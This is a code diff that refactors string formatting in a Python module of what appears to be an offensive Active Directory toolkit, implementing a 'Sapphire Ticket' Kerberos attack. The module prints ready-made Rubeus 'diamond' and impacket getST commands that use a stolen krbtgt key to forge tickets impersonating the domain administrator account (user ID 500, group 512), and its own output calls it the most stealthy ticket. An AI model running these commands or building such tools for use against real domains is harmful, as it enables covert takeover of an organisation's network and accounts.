@@ -1,6 +1,5 @@
 """Sapphire Ticket — S4U2Self+U2U PAC swap for stealthy impersonation."""
 
-from __future__ import annotations
 from typing import Any
 
 MANIFEST = {
@@ -21,7 +20,7 @@ def run(args: Any) -> int:
     dc_ip = getattr(args, "dc_ip", None)
 
     print("[*] Sapphire Ticket: S4U2Self + U2U PAC modification")
-    print("[*] Domain: {}  Impersonate: {}".format(cred.domain, impersonate))
+    print(f"[*] Domain: {cred.domain}  Impersonate: {impersonate}")
     print("[*] Most stealthy ticket — uses real PAC from legitimate TGT")
 
     if not krbtgt_hash:
@@ -29,8 +28,7 @@ def run(args: Any) -> int:
         return 1
 
     print("\n[*] Rubeus command:")
-    print("  Rubeus.exe diamond /krbkey:{} /tgtdeleg /enctype:aes256 /ticketuser:{} /ticketuserid:500 /groups:512".format(
-        krbtgt_hash, impersonate))
+    print(f"  Rubeus.exe diamond /krbkey:{krbtgt_hash} /tgtdeleg /enctype:aes256 /ticketuser:{impersonate} /ticketuserid:500 /groups:512")
     print("\n[*] impacket (getST + ticket modification):")
     print("  getST.py -spn cifs/{} -impersonate {} {}/{}".format(
         dc_ip or "DC01", impersonate, cred.domain, cred.username or "user"))
